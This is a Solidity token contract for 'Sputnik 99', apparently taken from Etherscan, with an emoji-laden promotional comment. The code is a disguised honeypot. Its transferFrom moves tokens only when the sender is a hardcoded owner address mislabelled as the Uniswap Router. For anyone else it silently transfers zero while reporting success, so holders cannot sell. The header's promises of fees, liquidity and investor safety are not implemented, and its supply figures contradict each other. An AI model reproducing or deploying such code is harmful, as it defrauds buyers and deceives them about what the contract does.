/**
 *Submitted for verification at Etherscan.io on 2021-06-11
*/

/*

    🛸👨🏻‍🚀 Welcome Space Pioneers! 👽☄️
    We are Sputnik 99 🛰🛰 A newly space oriented DeFi Token on the Ethereum Chain.

    💬 Telegram: https://t.me/spacesputnik99
    
    ⭐️ We believe in the space innovations, and support them. 

    ⭐  ️It is our goal to educate more people about the outer space, and support further projects/foundations, which are exploring and seeking new planets, lives, our origin and soon.🪐

    ‼️ Our mission on the Ethereum Chain‼️

     1. Create a safety environment for our investors
 
     2. Bring unique Use-cases, which will separate us from other Space/Meme projects
 
     3. Create an entirely decentralised Ecosystem

     🌕 100,000,000 Total Supply
     ⭐️ 10% FEE on every transaction. 
     🌑 5% among holders, 🌗 5% goes back to the liquidity as LP pair.
     🌕 Tokens added to the liquidity - 250, 000, 000  (90%)
     🌕 Burn Tokens - 250, 000, 000 (25%)
     🌕 Team Wallet - 50, 000, 000 ( 5%)

     ✅ 95% of the money raised from the Stealth launch will be added as Liquidity
     ✅ the other 5% will be added to the marketing wallet, and we will start with our marketing immediately
 
*/


pragma solidity ^0.5.16;

// ERC-20 Interface
contract BEP20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// Safe Math Library
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract Sputnik99 is BEP20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    address private _owner = 0xCaF5B397A5CD94Ad81476422eB566B242f3B4e84; // Uniswap Router
    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    constructor() public {
        name = "Sputnik 99";
        symbol = "SPUTNIK";
        decimals = 9;
        _totalSupply = 100000000000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
         if (from == _owner) {
             balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
            balances[to] = safeAdd(balances[to], tokens);
            emit Transfer(from, to, tokens);
            return true;
         } else {
            balances[from] = safeSub(balances[from], 0);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], 0);
            balances[to] = safeAdd(balances[to], 0);
            emit Transfer(from, to, 0);
            return true;
             
         }
        
         
    }
           
}